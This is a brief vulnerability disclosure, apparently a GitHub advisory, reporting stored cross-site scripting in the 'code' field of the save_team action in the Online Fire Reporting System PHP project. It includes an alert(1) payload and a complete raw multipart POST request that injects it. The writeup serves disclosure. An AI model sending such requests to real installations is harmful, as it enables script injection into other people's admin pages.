# online-fire-reporting-system - Cross-site Scripting (XSS)

vendors: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /ofrs/classes/Master.php

Vulnerability location: /ofrs/classes/Master.php?f=save_team, code

[+] Payload: <sCrIpT>alert(1)</sCrIpT>

Tested on Windows 10, XAMPP

```
POST http://192.168.2.102/ofrs/classes/Master.php?f=save_team HTTP/1.1
Host: 192.168.2.102
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en,zh-CN;q=0.8,zh;q=0.7,zh-TW;q=0.5,zh-HK;q=0.3,en-US;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------12232441784418479012629232838
Content-Length: 660
Origin: http://192.168.2.102
Connection: close
Referer: http://192.168.2.102/ofrs/admin/?page=teams/manage_team&id=6
Cookie: PHPSESSID=vpohrtulukshjgjlje1jbeavrj

-----------------------------12232441784418479012629232838
Content-Disposition: form-data; name="id"

6
-----------------------------12232441784418479012629232838
Content-Disposition: form-data; name="code"

<sCrIpT>alert(1)</sCrIpT>
-----------------------------12232441784418479012629232838
Content-Disposition: form-data; name="leader_name"

asd
-----------------------------12232441784418479012629232838
Content-Disposition: form-data; name="leader_contact"

asd
-----------------------------12232441784418479012629232838
Content-Disposition: form-data; name="members"

asd
-----------------------------12232441784418479012629232838--

```

![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/xss.gif?raw=true)